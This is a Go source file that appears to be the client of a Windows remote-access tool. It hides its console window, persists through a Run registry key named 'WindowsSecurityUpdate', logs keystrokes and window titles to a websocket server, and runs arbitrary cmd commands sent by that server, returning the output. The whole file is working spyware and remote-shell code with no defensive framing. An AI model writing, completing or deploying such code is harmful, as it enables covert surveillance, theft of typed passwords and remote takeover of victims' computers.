package main

import (
	"fmt"
	"log"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	"github.com/gorilla/websocket"
)

const (
	ServerIP   = "SERVER_IP_PLACEHOLDER"
	ServerPort = "SERVER_PORT_PLACEHOLDER"
)

type Message struct {
	Type string      `json:"type"`
	Data interface{} `json:"data"`
	Time time.Time   `json:"time"`
}

type ActivityData struct {
	Type        string    `json:"type"`
	Application string    `json:"application"`
	WindowTitle string    `json:"windowTitle"`
	KeyStroke   string    `json:"keyStroke,omitempty"`
	Timestamp   time.Time `json:"timestamp"`
}

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	getWindowText       = user32.NewProc("GetWindowTextW")
	getWindowTextLength = user32.NewProc("GetWindowTextLengthW")
	getForegroundWindow = user32.NewProc("GetForegroundWindow")
	messageBox          = user32.NewProc("MessageBoxW")
	getAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	getConsoleWindow    = kernel32.NewProc("GetConsoleWindow")
	showWindow          = user32.NewProc("ShowWindow")

	conn      *websocket.Conn
	isLogging bool = true
)

func main() {
	// Hide console window for stealth
	hideConsole()

	// Add to startup
	addToStartup()

	// Connect to server
	connectToServer()

	// Start activity monitoring
	go startKeylogger()
	go startActivityMonitor()

	// Keep connection alive
	for {
		time.Sleep(1 * time.Second)
		if conn == nil {
			connectToServer()
		}
	}
}

func hideConsole() {
	if runtime.GOOS != "windows" {
		return
	}

	console, _, _ := getConsoleWindow.Call()
	if console != 0 {
		showWindow.Call(console, 0) // SW_HIDE = 0
	}
}

func addToStartup() {
	if runtime.GOOS != "windows" {
		return
	}

	exe, err := os.Executable()
	if err != nil {
		return
	}

	// Add to Windows startup registry
	cmd := exec.Command("reg", "add",
		"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", "WindowsSecurityUpdate", "/t", "REG_SZ", "/d", exe, "/f")
	cmd.Run()
}

func connectToServer() {
	serverURL := fmt.Sprintf("ws://%s:%s/ws/client", ServerIP, ServerPort)
	u, err := url.Parse(serverURL)
	if err != nil {
		log.Printf("URL parse error: %v", err)
		return
	}

	var dialer websocket.Dialer
	conn, _, err = dialer.Dial(u.String(), nil)
	if err != nil {
		log.Printf("Connection error: %v", err)
		time.Sleep(30 * time.Second) // Retry in 30 seconds
		return
	}

	// Register with server
	hostname, _ := os.Hostname()
	regMsg := Message{
		Type: "register",
		Data: map[string]interface{}{
			"hostname": hostname,
			"os":       runtime.GOOS,
		},
		Time: time.Now(),
	}

	conn.WriteJSON(regMsg)

	// Listen for server commands
	go handleServerMessages()
}

func handleServerMessages() {
	for {
		if conn == nil {
			break
		}

		var msg Message
		err := conn.ReadJSON(&msg)
		if err != nil {
			log.Printf("Read error: %v", err)
			conn = nil
			break
		}

		switch msg.Type {
		case "popup_message":
			showPopupMessage(msg.Data.(string))
		case "start_logging":
			isLogging = true
		case "stop_logging":
			isLogging = false
		case "run_command":
			runCommand(msg.Data.(string))
		}
	}
}

func showPopupMessage(message string) {
	if runtime.GOOS != "windows" {
		return
	}

	title := stringToUTF16Ptr("System Message")
	text := stringToUTF16Ptr(message)
	messageBox.Call(0, uintptr(unsafe.Pointer(text)), uintptr(unsafe.Pointer(title)), 0)
}

func stringToUTF16Ptr(s string) *uint16 {
	utf16 := utf16.Encode([]rune(s + "\x00"))
	return &utf16[0]
}

func runCommand(command string) {
	cmd := exec.Command("cmd", "/C", command)
	output, err := cmd.Output()

	result := "Command executed successfully"
	if err != nil {
		result = fmt.Sprintf("Error: %v", err)
	} else {
		result = string(output)
	}

	sendActivityLog("command_execution", "", result)
}

func startActivityMonitor() {
	var lastWindow string

	for {
		if !isLogging {
			time.Sleep(1 * time.Second)
			continue
		}

		currentWindow := getCurrentWindow()
		if currentWindow != lastWindow {
			sendActivityLog("window_change", currentWindow, "")
			lastWindow = currentWindow
		}

		time.Sleep(500 * time.Millisecond)
	}
}

func getCurrentWindow() string {
	if runtime.GOOS != "windows" {
		return ""
	}

	hwnd, _, _ := getForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}

	length, _, _ := getWindowTextLength.Call(hwnd)
	if length == 0 {
		return ""
	}

	buffer := make([]uint16, length+1)
	getWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buffer[0])), length+1)

	return utf16ToString(buffer)
}

func utf16ToString(s []uint16) string {
	for i, v := range s {
		if v == 0 {
			s = s[0:i]
			break
		}
	}
	return string(utf16.Decode(s))
}

func startKeylogger() {
	// Simple keylogger implementation
	for {
		if !isLogging {
			time.Sleep(100 * time.Millisecond)
			continue
		}

		// Check for key presses (simplified)
		for i := 8; i <= 255; i++ {
			if isKeyPressed(i) {
				key := getKeyName(i)
				if key != "" {
					sendActivityLog("keystroke", getCurrentWindow(), key)
				}
				time.Sleep(50 * time.Millisecond) // Debounce
			}
		}

		time.Sleep(10 * time.Millisecond)
	}
}

func isKeyPressed(key int) bool {
	if runtime.GOOS != "windows" {
		return false
	}

	state, _, _ := getAsyncKeyState.Call(uintptr(key))
	return (state & 0x8000) != 0
}

func getKeyName(key int) string {
	keyMap := map[int]string{
		8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]", 16: "[SHIFT]",
		17: "[CTRL]", 18: "[ALT]", 20: "[CAPS]", 27: "[ESC]",
		32: " ", 37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]",
	}

	if name, exists := keyMap[key]; exists {
		return name
	}

	// For alphanumeric keys
	if key >= 48 && key <= 57 { // 0-9
		return string(rune(key))
	}
	if key >= 65 && key <= 90 { // A-Z
		return string(rune(key))
	}

	return ""
}

func sendActivityLog(activityType, window, keystroke string) {
	if conn == nil {
		return
	}

	activity := ActivityData{
		Type:        activityType,
		Application: window,
		WindowTitle: window,
		KeyStroke:   keystroke,
		Timestamp:   time.Now(),
	}

	msg := Message{
		Type: "activity_log",
		Data: activity,
		Time: time.Now(),
	}

	conn.WriteJSON(msg)
}
